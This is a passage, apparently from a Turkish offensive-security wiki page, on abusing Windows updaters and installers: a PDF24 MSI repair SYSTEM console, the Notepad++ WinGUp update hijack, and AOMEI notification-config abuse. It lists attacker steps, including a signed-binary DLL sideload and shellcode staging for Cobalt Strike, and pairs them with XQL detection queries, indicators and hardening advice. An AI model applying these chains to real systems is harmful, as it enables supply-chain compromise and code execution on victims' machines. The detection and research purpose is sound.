- Bu örüntü, **geçici script'leri herkesin yazabildiği konumlara yerleştirip daha sonra SYSTEM olarak çalıştıran** diğer endpoint agent'ları ve updater'lar için de geçerlidir. Tahmin edilebilir adları, exclusive create semantiğinin eksikliğini ve isteğe bağlı olarak tetiklenebilen onarım/güncelleme akışlarını test edin.

### Etkileşimli installer onarımı ve ayrıcalıklı konsol

PDF24 Creator 11.15.1, MSI onarımına ilişkin ayrı bir riski gözler önüne seriyor: yazıcı yükleme custom action'ı, onarım sırasında SYSTEM haklarıyla görünür bir konsol başlatabiliyor. Üretici, bu davranışı gidermek için MSI installer'ını 11.15.2 sürümünde değiştirdi. Ürünün eski bir sürümü yalnızca bir triage ipucudur. Kayıtlı veya erişilebilir MSI paketini, bu kullanıcının onarımı başlatıp başlatamayacağını, güvenlik açığı bulunan custom action'ın ve log dosyası gecikmesinin mevcut olup olmadığını ve etkileşimli bir masaüstünün konsolu gösterip gösteremeyeceğini kontrol edin. Bildirilen gecikmede `faxPrnInst.log` üzerinde bir oplock kullanılıyordu; dosyanın sıradan şekilde yazılabilir olması tek erişim koşulu değildi. Erişilemeyen bir package, etkileşimsiz bir shell veya yamalı bir installer zincirin kurulmasını engelleyebilir. Bu sorun `AlwaysInstallElevated` özelliğine bağlı değildir ve tahmin edilebilir bir geçici script'i değiştirmekten farklıdır.

---
## Zayıf updater doğrulaması üzerinden uzaktan supply-chain hijacking (WinGUp / Notepad++)

Haziran 2025 ile Aralık 2025 arasında, Notepad++ güncelleme akışının arkasındaki hosting altyapısını ele geçiren saldırganlar, seçtikleri kurbanlara kötü amaçlı manifest'leri seçici olarak sundu. Eski WinGUp tabanlı updater'lar güncellemenin gerçekliğini tam olarak doğrulamadığından, kötü amaçlı bir XML yanıtı istemcileri saldırganların kontrolündeki URL'lere yönlendirebiliyordu. İstemci, hem güvenilir bir sertifika zincirini hem de indirilen installer'ın geçerli bir PE imzasını zorunlu kılmadan HTTPS içeriğini kabul ettiği için kurbanlar trojan'laştırılmış bir NSIS `update.exe` dosyasını indirip çalıştırdı.<sup>[[12]](#references)[[13]](#references)</sup>

Operasyonel akış (yerel exploit gerekmez):
1. **Altyapı trafiğini ele geçirme**: CDN/hosting altyapısını ele geçirin ve güncelleme kontrollerine, kötü amaçlı bir indirme URL'sini gösteren saldırgan metadata'sıyla yanıt verin.
2. **Trojan'laştırılmış NSIS**: Installer bir payload indirip çalıştırır ve iki execution chain'i kötüye kullanır:
   - **Kendi imzalı binary'sini getir + sideload**: İmzalı Bitdefender `BluetoothService.exe` dosyasını pakete ekleyin ve arama yoluna kötü amaçlı bir `log.dll` bırakın. İmzalı binary çalıştığında Windows, `log.dll` dosyasını sideload eder; bu DLL, statik tespiti zorlaştırmak için Warbird koruması ve API hashing kullanan Chrysalis backdoor'unu çözüp reflectively yükler.
   - **Script ile shellcode injection**: NSIS, shellcode enjekte etmek ve Cobalt Strike Beacon'ı hazırlamak için Win32 API'lerini (ör. `EnumWindowStationsW`) kullanan derlenmiş bir Lua script'i çalıştırır.<sup>[[12]](#references)</sup>

Herhangi bir auto-updater için hardening/tespit çıkarımları:
- İndirilen installer için **sertifika + imza doğrulamasını** zorunlu kılın (üretici imzalayanını pinleyin, eşleşmeyen CN/zinciri reddedin) ve güncelleme manifest'inin kendisini de imzalayın (ör. XMLDSig). Manifest'in yönettiği yönlendirmeleri doğrulanmadıkları sürece engelleyin.
- **Kendi imzalı binary'sini getirerek sideload etme** yöntemini, indirme sonrası tespit için bir pivot olarak ele alın: imzalı bir üretici EXE'sinin kendi standart kurulum yolu dışındaki bir DLL adını yüklemesi durumunda (ör. Bitdefender'ın Temp/Downloads içinden `log.dll` yüklemesi) ve bir updater'ın Temp'e üretici imzası taşımayan installer'lar bırakıp çalıştırması durumunda uyarı verin.
- Bu zincirde gözlemlenen **kötü amaçlı yazılıma özgü artifact'leri** izleyin (genel amaçlı pivot'lar olarak faydalıdır): `Global\Jdhfv_1.0.1` mutex'i, `%TEMP%` konumuna yapılan olağandışı `gup.exe` yazımları ve Lua ile yürütülen shellcode injection aşamaları.
- Notepad++ yanıt olarak v8.8.9 ve sonraki sürümlerde WinGUp'ı güçlendirdi: döndürülen XML artık imzalanıyor (XMLDSig) ve yeni build'ler yalnızca aktarım kanalına güvenmek yerine indirilen installer için sertifika + imza doğrulamasını zorunlu kılıyor.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender imzalı EXE ile <code>log.dll</code> sideloading (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> Notepad++ dışı bir yükleyiciyi başlatıyor</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Bu örüntüler, imzasız manifestleri kabul eden veya yükleyici imzalayanlarını sabitlemeyen tüm updater'lar için geçerlidir: network hijack + malicious installer + BYO-signed sideloading, “trusted” güncellemeler kisvesi altında remote code execution sağlar.

### İkinci bir güncelleme tetikleyicisi olarak bildirim yapılandırması

Bir updater, içeriği **hazırlamak ve çalıştırılmasını tetiklemek** için ayrı remote yapılandırmalar kullanabilir. Bunun için yapılandırmaların veya bunlara verilen yanıtların kontrol edilmesi gerekir; raporlar kaynağa erişimin nasıl elde edildiğini belirtmiyor. AOMEI vakasında `down_html.ini`, bir arşiv URL'si, sürümü (`thrid`) ve MD5 değerini (`Val`) seçiyordu; saldırgan sürümü yükseltti ve URL'yi, eşleşen checksum ile birlikte değiştirdi. Bu, yukarıda ele alınan [metadata trust-boundary failure](#2-hijacking-the-update-channel-to-run-code-as-system) durumudur. Ek yürütme yolu `Notifycfg.ini` dosyasıydı: bu dosya, `ABNotify.exe`'yi WebView içinde yerel bir `file:///` URL'si üzerinden çıkarılmış `upgrade-now.html` dosyasını yüklemeye yönlendiriyordu. Sayfa otomatik olarak aynı dizindeki bir executable'a yönlendirildi; WebView de bu dosyayı sistem shell'ine verdi. Alt süreç, bildiricinin ayrıcalıklarını devraldı; bu durum kendi başına onu SYSTEM seviyesine yükseltmedi.<sup>[[17]](#references)[[18]](#references)</sup>

Google ayrıca, bu istemcinin olağan sürüm kontrolünü aşan, 35.000'den fazla yinelenen sahte bölüm içeren, değiştirilmiş bir `Notifycfg.ini` bildirdi. Rapor, genel bir parser bypass olduğunu ortaya koymuyor. Saldırgan, remote dosyaları beş ila on dakikalık aralıkların ardından eski hâline getirdi; bu nedenle yalnızca bu aralıklarda sorgulama yapan istemciler değiştirilmiş yapılandırmayı aldı. Bu bildirim kanalı, arşivin çalıştırılmasını gerektirmeyen ayrı bir [WebDAV/NTLM coercion lure](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion) da taşıyordu.<sup>[[18]](#references)</sup>

---
## References
- [1] [Uyarı – Windows için Netskope Client – Rogue Server üzerinden yerel ayrıcalık yükseltme (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Güvenlik Uyarısı NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope eklentisi](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC istemcisi/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre ve Razer Synapse 4'ü ele geçirmek](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent'taki yazılabilir dosyalar üzerinden yerel ayrıcalık yükseltme](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent'ta ayrıcalık yükseltme](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoC'leri](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Ulus-devlet aktörleri Notepad++ tedarik zincirinden yararlanıyor](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – ele geçirilmiş altyapı olayıyla ilgili güncelleme](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Windows için Netskope Client'ta CVE-2025-0309 düzeltmesini aşma](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage'daki ayrıcalık yükseltme hatalarını ortaya çıkarma](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: gRPC'den SYSTEM'e](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – AOMEI Backupper tedarik zinciri ihlali](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group ve Mandiant – Geçici tedarik zinciri kurcalamasını araştırma](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
